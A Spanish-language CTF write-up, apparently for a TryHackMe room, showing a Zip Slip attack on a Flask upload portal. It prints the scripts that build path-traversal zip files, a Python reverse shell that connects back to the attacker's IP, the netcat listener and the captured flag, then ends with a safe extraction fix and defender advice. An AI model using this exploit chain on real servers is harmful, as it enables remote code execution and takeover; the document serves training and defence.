---
layout: post
title: "The Hollow Shell"
date: 2026-08-05
categories: [TryHackMe, Hacker Holidays 2026]
tags: [web, zip-slip, rce, flask, python, medium]
---

> **Plataforma:** TryHackMe — Hacker Holidays 2026  
> **Sala:** The Hollow Shell  
> **Categoría:** Web  
> **Dificultad:** Medium  
> **Flag:** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

---

## Descripción del reto

> 🛎️ *You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.*
> 
> *The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own.*

El briefing ya carga con pistas si se lee con atención:

- **"Upload a shell"** → subida de archivos con doble sentido (concha ↔ web shell).
- **"Slip past what the portal forgets to check"** → el portal no valida algo en la extracción del zip.
- **"The shell answers with a shell of your own"** → el objetivo final es RCE (Remote Code Execution).

La cadena de ataque completa resulta ser:  
`Zip Slip (escritura arbitraria de archivos) → escritura en carpeta vigilada por worker → ejecución automática → reverse shell`

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV --min-rate 5000 <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
5000/tcp open  http    gunicorn
```

Dos puertos abiertos. El servicio web **no está en el 80**, sino en el **5000**, corriendo sobre **gunicorn** (lo que confirma que la app está hecha en Python — Flask con toda probabilidad). Navegando a `http://<IP>:5000` la app redirige automáticamente a `/login`.

---

## Acceso inicial — credenciales filtradas en el código fuente

Al ver el código fuente del login (`Ctrl+U` en el navegador) aparece un comentario HTML que el equipo de IT dejó olvidado:

```html
<!--
  Byte Lotus // internal display-manager portal
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
      user: concierge
      pass: StayNoticed2024!
  (rotate it from Settings on first sign-in — most people forget)
-->
```

Credenciales hardcodeadas en el HTML público. Error clásico de "lo dejo temporal y me olvido". Iniciamos sesión con `concierge / StayNoticed2024!` y llegamos al dashboard.

---

## Análisis del dashboard

El panel de staff expone dos funcionalidades:

1. **Subida de shells**: acepta un `.zip` que debe contener un manifiesto `shell.json` listando sus assets (`png jpg gif svg css json`).
2. **Listado de shells activos**: muestra el nombre y el ID de cada shell subido (p.ej. `shells/18ced5ab0c5f/`).

Una nota en el dashboard llama la atención:

> *"A shell may include optional **automation hooks** — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand."*

Dos pistas críticas aquí:
- Existe un proceso en segundo plano (**theme worker**) que procesa las shells automáticamente.
- Hay un mecanismo de **"hooks"** opcionales que ese worker aplica.

Esto sugiere que si un archivo llega a una carpeta que ese worker vigila, podría ejecutarlo automáticamente.

---

## Confirmando el Zip Slip

Primero verificamos el comportamiento base subiendo un zip válido para entender qué hace la app:

```json
{
  "name": "test-shell",
  "assets": ["beach.css"]
}
```

El zip se acepta, el shell aparece en el dashboard con un ID único, y los archivos son accesibles en:

```
GET /shells/<id>/shell.json
GET /shells/<id>/beach.css
```

Ahora probamos si el servidor sanitiza los nombres de las entradas del zip durante la extracción. La herramienta `zip` estándar normaliza rutas y no permite `../`, pero Python sí:

```python
import json, zipfile

manifest = {"name": "zipslip-confirm", "assets": []}
with zipfile.ZipFile("confirm.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../static/zipslip_confirm.txt", "ZIP_SLIP_CONFIRMED")
```

Subimos el zip y luego:

```bash
curl -s http://<IP>:5000/static/zipslip_confirm.txt
```

Respuesta: `ZIP_SLIP_CONFIRMED`

**Zip Slip confirmado.** El servidor extrae el zip sin validar los nombres de las entradas, lo que permite escribir archivos en rutas arbitrarias fuera del directorio de destino.

### Por qué el zip estándar no sirve aquí

El comando `zip` normaliza automáticamente los nombres de archivo y elimina los `../`. Python's `zipfile.ZipFile.writestr()` los escribe tal cual, sin sanitización, por eso es la herramienta correcta para armar un zip de Zip Slip.

---

## Explotación — Reverse shell vía `/hooks/`

### Hipótesis del directorio `/hooks/`

Dado que:
1. Tenemos escritura arbitraria de archivos en el servidor.
2. Existe un "theme worker" que procesa las shells automáticamente.
3. La descripción menciona explícitamente "automation hooks".

La hipótesis es que existe una carpeta `/hooks/` en el filesystem (hermana de `shells/` y `static/`) que el worker vigila y ejecuta automáticamente cualquier script `.py` nuevo que aparezca. El nombre es una inferencia educada basada en el lenguaje del reto — no es una ruta HTTP, es una carpeta del sistema.

### Preparar el payload

Creamos el script de reverse shell sin indentación (para evitar `IndentationError` en Python al ejecutarse):

```python
# callback.py
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("TU_IP_TUN0", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

> **Nota:** al generar el payload desde Python con cadenas multilínea indentadas (dentro de un bloque `if` o función), el contenido heredará los espacios de indentación del código envolvente. Eso produce un `IndentationError` cuando el servidor intenta ejecutarlo. La forma segura es escribir el payload a un archivo separado primero y luego leerlo al armar el zip.

Armamos el zip malicioso:

```python
import json, zipfile

manifest = {"name": "shoreline-update", "assets": []}

with open("callback.py") as f:
    payload = f.read()

with zipfile.ZipFile("hook-rce.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", payload)
```

Verificamos que el nombre de la entrada quedó correcto:

```bash
unzip -l hook-rce.zip
```

```
shell.json
../../hooks/callback.py
```

### Ejecutar

En una terminal aparte, levantamos el listener:

```bash
nc -lvnp 4444
```

Subimos el zip:

```bash
curl -s -b cookies.txt \
  -F "shell=@hook-rce.zip" \
  http://<IP>:5000/upload
```

Unos segundos después (el worker tiene un pequeño delay, como dice el dashboard), la conexión llega:

```
Ncat: Connection from <IP>:55430.
roomservice@tryhackme-2404:/var/www/conch$
```

---

## Flag

```bash
cd /home/roomservice
cat flag.txt
```

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Análisis de la vulnerabilidad

### Zip Slip (CVE-2018-1002220 y variantes)

Zip Slip es una vulnerabilidad de path traversal que ocurre durante la **extracción** de archivos comprimidos. Si el servidor extrae un zip sin validar que los nombres de sus entradas permanezcan dentro del directorio de destino, un atacante puede escribir archivos en rutas arbitrarias del sistema de archivos.

La condición vulnerable típica en Python es:

```python
# VULNERABLE
import zipfile, os

with zipfile.ZipFile("upload.zip") as z:
    z.extractall("/var/www/app/shells/")
```

`extractall()` sin validación de rutas respeta los `../` en los nombres de entrada y escribe fuera del destino. La corrección es validar cada nombre antes de extraer:

```python
# SEGURO
import zipfile, os

DEST = "/var/www/app/shells/"

with zipfile.ZipFile("upload.zip") as z:
    for entry in z.namelist():
        target = os.path.realpath(os.path.join(DEST, entry))
        if not target.startswith(os.path.realpath(DEST)):
            raise Exception(f"Zip Slip detectado: {entry}")
    z.extractall(DEST)
```

### Worker con ejecución automática no restringida

El "theme worker" ejecuta automáticamente cualquier archivo `.py` que aparezca en la carpeta `/hooks/`. Sin una allowlist de scripts autorizados o sin verificar la integridad/firma de los archivos antes de ejecutarlos, cualquier archivo que llegue ahí (por ejemplo, vía Zip Slip) se convierte en ejecución de código arbitrario.

La corrección implica combinar la sanitización del zip con controles sobre la carpeta de hooks: validar origen, firma HMAC, o directamente no aceptar código ejecutable como parte de un asset de usuario.

---

## Resumen de la cadena

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | nmap | Servicio en puerto 5000, Flask/gunicorn |
| Information disclosure | Comentario HTML | Credenciales `concierge / StayNoticed2024!` |
| Análisis del portal | Revisión del dashboard | Identificación del mecanismo de hooks |
| PoC | Zip Slip a `/static/` | Escritura arbitraria de archivos confirmada |
| Explotación | Zip Slip a `/hooks/callback.py` | RCE como `roomservice` |
| Flag | `cat /home/roomservice/flag.txt` | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |

---

## Lecciones aprendidas

**Para atacantes (CTF):** cuando una app acepta archivos comprimidos y los extrae en el servidor, Zip Slip siempre vale la pena probarlo. La clave es armar el zip con Python directamente (no con el comando `zip`), ya que las herramientas estándar normalizan rutas. Una vez con escritura arbitraria, la pregunta es qué proceso corre en el servidor y qué carpetas vigila.

**Para defensores:** nunca extraer un zip sin validar que cada entrada quede dentro del directorio de destino (`os.path.realpath` + `startswith`). Además, si existe un worker que procesa archivos automáticamente, ese directorio debe estar protegido de escritura para cualquier proceso no privilegiado, y solo debe ejecutar scripts pre-autorizados.
